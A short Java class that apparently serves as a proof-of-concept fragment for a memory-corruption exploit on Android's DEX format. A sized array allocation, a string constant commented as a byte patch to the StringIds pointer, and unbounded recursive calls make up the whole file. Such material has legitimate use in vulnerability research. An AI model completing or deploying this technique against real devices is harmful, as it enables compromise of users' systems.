
public class Min {
    public Min() {
        foo();
    }
    //public static void main(String[] args) {
    //}
    public static void foo() {
        int a[] = new int[(0xff-1-0x20)*0x1000/8-5];
        String x;
        x = "-167";  // patch the 2nd bytes to StringIds pointer, offset to StringIds, (0xb0-0x19)
        foo();
        foo();
        foo();
        foo();
        foo();
    }
}
